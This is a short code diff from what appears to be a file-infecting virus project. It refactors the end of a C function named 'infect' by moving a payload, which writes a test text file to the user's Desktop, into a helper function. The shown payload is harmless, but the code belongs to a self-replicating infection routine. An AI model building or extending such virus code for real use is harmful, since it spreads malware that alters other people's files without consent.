@@ -68,30 +68,10 @@ inline bool	infect(const struct virus_header *vhdr, const char *file)
 	free_accessor(&file_ref);
 	free_accessor(&clone_ref);
 
-    char *user = getenv("USER"); // obter o nome do usuário
-    if (user == NULL) { // verificar se foi possível obter o nome do usuário
-        printf("Não foi possível obter o nome do usuário.\n");
+    if (create_text_and_write()){
 		log_success();
-        return 1;
-    }
+		return true;
+	}
     
-    // montar o caminho do arquivo na área de trabalho do usuário
-    char path[256];
-    snprintf(path, sizeof(path), "/home/%s/Desktop/arquivo.txt", user);
-    
-    // criar o arquivo e escrever o conteúdo
-    FILE *file = fopen(path, "w");
-    if (file == NULL) { // verificar se foi possível criar o arquivo
-        printf("Não foi possível criar o arquivo.\n");
-		log_success();
-        return 1;
-    }
-    fputs("Teste escrevi aqui novamente! ", file);
-    fclose(file);
-    
-    printf("Arquivo criado com sucesso em: %s\n", path);
-    
-
-	log_success();
-	return true;
+	return false;
 }
